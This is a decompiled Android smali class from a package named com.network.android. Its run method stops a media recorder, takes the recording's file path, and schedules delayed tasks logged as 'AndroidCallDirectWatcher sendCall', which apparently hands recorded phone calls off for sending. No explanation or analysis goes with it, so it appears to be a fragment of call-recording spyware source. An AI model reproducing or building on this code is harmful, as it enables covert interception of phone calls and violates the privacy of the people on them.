.class final Lcom/network/android/b;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Landroid/os/Handler;

.field final synthetic c:Ljava/lang/String;


# direct methods
.method constructor <init>(Landroid/content/Context;Landroid/os/Handler;)V
    .locals 1

    iput-object p1, p0, Lcom/network/android/b;->a:Landroid/content/Context;

    iput-object p2, p0, Lcom/network/android/b;->b:Landroid/os/Handler;

    const/4 v0, 0x0

    iput-object v0, p0, Lcom/network/android/b;->c:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 5

    invoke-static {}, Lcom/network/media/r;->b()Landroid/media/MediaRecorder;

    move-result-object v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/network/android/b;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/media/r;->b(Landroid/content/Context;)V

    invoke-static {}, Lcom/network/media/r;->a()Ljava/lang/String;

    move-result-object v0

    :goto_0
    const-string v1, "AndroidCallDirectWatcher sendCall send call in(ms): 4000"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/network/android/b;->b:Landroid/os/Handler;

    new-instance v2, Lcom/network/android/c;

    invoke-direct {v2, p0}, Lcom/network/android/c;-><init>(Lcom/network/android/b;)V

    const-wide/16 v3, 0x1f4

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    iget-object v1, p0, Lcom/network/android/b;->b:Landroid/os/Handler;

    new-instance v2, Lcom/network/android/d;

    invoke-direct {v2, p0, v0}, Lcom/network/android/d;-><init>(Lcom/network/android/b;Ljava/lang/String;)V

    const-wide/16 v3, 0xfa0

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :cond_0
    const-string v0, "AndroidCallDirectWatcher stopRecord recorder == null"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v0, 0x0

    goto :goto_0
.end method
